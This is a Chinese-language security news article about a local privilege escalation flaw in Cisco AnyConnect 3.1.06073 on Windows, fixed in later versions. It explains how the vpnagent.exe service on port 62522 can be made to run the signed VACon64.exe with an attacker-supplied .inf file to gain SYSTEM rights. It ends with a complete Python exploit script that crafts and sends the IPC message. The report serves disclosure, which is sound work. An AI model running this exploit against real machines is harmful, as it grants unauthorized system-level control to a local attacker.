思科修复AnyConnect本地命令执行漏洞 发布更新 AnyConnect4.0.02052 和3.1.08009 版本

2015-06-24 11:08:15 阅读：14601次 点赞(0) 收藏 来源： 安全客

漏洞已被思科确认存在AnyConnect安全移动客户端v3.1.06073windows版本中。这个漏洞可以利用本地非特权用户在得到系统权限。目前在Windows7 64位已经验证成功。

一旦客户端安装完毕,AnyConnect将开始执行vpnagent.exe作为系统服务。这个过程中在本地打开TCP端口62522并解析请求发送给它。协议遵循一个简单的报文结构(TLV)。它将执行不同的处理程序基于l类型的请求。

作为一项安全措施,vpnagent.exe执行验证二进制是“思科系统公司签署有效。“通过调用CProcessApi::SetVerifyFileSignature,阻止我们推出任何随机二进制系统。

思科二进制文件,签署VACon64.exe(amd64特定版本)之初。这个二进制文件将一个目录作为参数,并执行InstallHInfSection硬编码。inf文件的名字。这是特别不安全的,因为我们可以构建自己的。inf文件安装的服务,例如,执行cmd.exe，这样就可以实现本地系统权限的命令执行。

这个漏洞被思科公开在1月26日2015(psirt - 1269982510)。这是次是修复和发布4.0.02052 和3.1.08009 AnyConnect的更新版本。

import socket
import binascii
import struct
import array
import os
import uuid
 
"""
Cisco AnyConnect Secure Mobility Client v3.1.06073
 
 One of the calls will execute any supplied binary, provided that it is
 signed by Cisco. VACon64.exe (I only looked at 64-bit) is signed, and
 installs a driver from an .inf file.
 
Some markers:
CIpcTransport::OnSocketReadComplete
CIpcDepot::OnIpcMessageReceived
CIpcMessage::isIdTagValid -- cmp dword ptr [ecx], 4353434Fh
CIpcMessage::getDataLength -- movzx eax, word ptr [ecx+6]
CIpcMessage::getMessageID -- movzx eax, byte ptr [ecx+19h]
CIpcMessage::getMessageType -- movzx eax, byte ptr [ecx+18h] & and eax, 1Fh
CIpcMessage::getDataBuffer -- movzx eax, word ptr [ecx+4] & add eax, ecx
"CMainThread::OnIpcMessageReceivedAtDepot" in vpnagent
"""
 
def ipc_recv(s):
    try:
        r=s.recv(8)
    except socket.error:
        return None
    if len(r)<8:
        return None
    _,o,l=struct.unpack('<IHH',r)
    t=o+l
    while len(r)!=t:
        try:
            r+=s.recv(min(t-len(r),1024))
        except socket.error:
            return None
    return r
 
def pack_tlv(a):
    r=b''
    for t,v in a:
        r+=struct.pack('>HH',0x8000|t,v) if type(v) is int else struct.pack('>HH',t,len(v))+v
    return r
 
s=socket.socket()
s.settimeout(5)
s.connect(('localhost',62522))
data=pack_tlv([[1,b'C:\\Program Files (x86)\\Cisco\\Cisco AnyConnect Secure Mobility Client\\VACon64.exe\0'],
               [2,b'kdf -install "%s" acsock\0'%(os.path.dirname(os.path.realpath(__file__)))],
               [4,b'WinSta0\\Default\0']])
header=struct.pack('<IHH',0x4353434f,0x1a,len(data)) #tag,offset,len
header+=uuid.uuid4().bytes_le #16 bytes
header+=struct.pack('<BB',1,2)
s.send(header+data)
r=ipc_recv(s)
if r is not None:
    print(binascii.b2a_hex(r))
s.close()
